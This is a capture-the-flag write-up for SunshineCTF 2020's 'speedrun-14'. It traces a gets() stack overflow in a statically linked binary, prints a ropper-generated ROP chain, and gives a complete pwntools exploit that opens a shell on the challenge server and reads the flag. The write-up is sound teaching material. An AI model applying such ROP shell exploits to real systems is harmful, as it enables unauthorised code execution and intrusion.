# **speedrun-14**
## Task
nc chal.2020.sunshinectf.org 30014
File: chall_14
Tag: binary exploitation 

## Solution

### Checksec
```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```
### Decompile with ghidra
```c
void main(void)

{
  char local_68 [64];
  char local_28 [32];
  
  puts("You can hear the sound of a thousand...");
  fgets(local_28,0x14,(FILE *)stdin);
  gets(local_68);
  return;
}
```
The same with [speedrun-13](), We don't have `win`.However, This is a statically linked the we use the `ropper` tool to generate the gadgets

```bash
$ file chall_14 
chall_14: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, for GNU/Linux 3.2.0, BuildID[sha1]=2936c7ad85f602a3701fef5df2a870452f6d3499, not stripped
```

```bash
$ ropper --file chall_14 --chain "execve cmd=/bin/sh"
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%

[INFO] ROPchain Generator for syscall execve:


[INFO] 
write command into data section
rax 0xb
rdi address to cmd
rsi address to null
rdx address to null


[INFO] Try to create chain which fills registers without delete content of previous filled registers
[*] Try permuation 1 / 24
[INFO] 

[INFO] Look for syscall gadget

[INFO] syscall gadget found
[INFO] generating rop chain
#!/usr/bin/env python
# Generated by ropper ropchain generator #
from struct import pack

p = lambda x : pack('Q', x)

IMAGE_BASE_0 = 0x0000000000400000 # 913a7aa51d9185a1088a36aa69b5a863758c4a92a8f050297c9491bd33b78d65
rebase_0 = lambda x : p(x + IMAGE_BASE_0)

rop = ''

rop += rebase_0(0x000000000000da7b) # 0x000000000040da7b: pop r13; ret; 
rop += '//bin/sh'
rop += rebase_0(0x0000000000000696) # 0x0000000000400696: pop rdi; ret; 
rop += rebase_0(0x00000000002b90e0)                                                                               
rop += rebase_0(0x0000000000068a29) # 0x0000000000468a29: mov qword ptr [rdi], r13; pop rbx; pop rbp; pop r12; pop
rop += p(0xdeadbeefdeadbeef)                                                                                      
rop += p(0xdeadbeefdeadbeef)                                                                                      
rop += p(0xdeadbeefdeadbeef)                                                                                      
rop += p(0xdeadbeefdeadbeef)                                                                                      
rop += rebase_0(0x000000000000da7b) # 0x000000000040da7b: pop r13; ret;                                           
rop += p(0x0000000000000000)                                                                                      
rop += rebase_0(0x0000000000000696) # 0x0000000000400696: pop rdi; ret;                                           
rop += rebase_0(0x00000000002b90e8)                                                                               
rop += rebase_0(0x0000000000068a29) # 0x0000000000468a29: mov qword ptr [rdi], r13; pop rbx; pop rbp; pop r12; pop
rop += p(0xdeadbeefdeadbeef)                                                                                      
rop += p(0xdeadbeefdeadbeef)                                                                                      
rop += p(0xdeadbeefdeadbeef)                                                                                      
rop += p(0xdeadbeefdeadbeef)                                                                                      
rop += rebase_0(0x0000000000000696) # 0x0000000000400696: pop rdi; ret; 
rop += rebase_0(0x00000000002b90e0)
rop += rebase_0(0x0000000000010263) # 0x0000000000410263: pop rsi; ret; 
rop += rebase_0(0x00000000002b90e8)
rop += rebase_0(0x000000000004c086) # 0x000000000044c086: pop rdx; ret; 
rop += rebase_0(0x00000000002b90e8)
rop += rebase_0(0x00000000000158f4) # 0x00000000004158f4: pop rax; ret; 
rop += p(0x000000000000003b)
rop += rebase_0(0x0000000000074e35) # 0x0000000000474e35: syscall; ret; 
print rop
[INFO] rop chain generated!
```
Then embedded the gadgets into python script

### Exploit

```python
from pwn import *
binary = context.binary = ELF('./chall_14')
from struct import pack


p = lambda x : pack('Q',x)
IMAGE_BASE_0 = 0x0000000000400000 # 913a7aa51d9185a1088a36aa69b5a863758c4a92a8f050297c9491bd33b78d65
rebase_0 = lambda x : p(x + IMAGE_BASE_0)

rop = b''

rop += rebase_0(0x000000000000da7b) # 0x000000000040da7b: pop r13; ret; 
rop += b'//bin/sh'
rop += rebase_0(0x0000000000000696) # 0x0000000000400696: pop rdi; ret; 
rop += rebase_0(0x00000000002b90e0)
rop += rebase_0(0x0000000000068a29) # 0x0000000000468a29: mov qword ptr [rdi], r13; pop rbx; pop rbp; pop r12; pop r13; ret; 
rop += p(0xdeadbeefdeadbeef)
rop += p(0xdeadbeefdeadbeef)
rop += p(0xdeadbeefdeadbeef)
rop += p(0xdeadbeefdeadbeef)
rop += rebase_0(0x000000000000da7b) # 0x000000000040da7b: pop r13; ret; 
rop += p(0x0000000000000000)
rop += rebase_0(0x0000000000000696) # 0x0000000000400696: pop rdi; ret; 
rop += rebase_0(0x00000000002b90e8)
rop += rebase_0(0x0000000000068a29) # 0x0000000000468a29: mov qword ptr [rdi], r13; pop rbx; pop rbp; pop r12; pop r13; ret; 
rop += p(0xdeadbeefdeadbeef)
rop += p(0xdeadbeefdeadbeef)
rop += p(0xdeadbeefdeadbeef)
rop += p(0xdeadbeefdeadbeef)
rop += rebase_0(0x0000000000000696) # 0x0000000000400696: pop rdi; ret; 
rop += rebase_0(0x00000000002b90e0)
rop += rebase_0(0x0000000000010263) # 0x0000000000410263: pop rsi; ret; 
rop += rebase_0(0x00000000002b90e8)
rop += rebase_0(0x000000000004c086) # 0x000000000044c086: pop rdx; ret; 
rop += rebase_0(0x00000000002b90e8)
rop += rebase_0(0x00000000000158f4) # 0x00000000004158f4: pop rax; ret; 
rop += p(0x000000000000003b)
rop += rebase_0(0x0000000000074e35) # 0x0000000000474e35: syscall; ret;

r = remote('chal.2020.sunshinectf.org',30014)
payload = b'A'*0x68
payload += rop
r.sendline('IxZ')
r.sendline(payload)
r.interactive()
```

### Output
```bash
[*] '/home/kali/speedrun_sunshineCTF2020/chall_14'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to chal.2020.sunshinectf.org on port 30014: Done
[*] Switching to interactive mode
$ ls
chall_14
flag.txt
$ cat flag.txt
sun{hail-to-the-king-c24f18e818fb4986}
```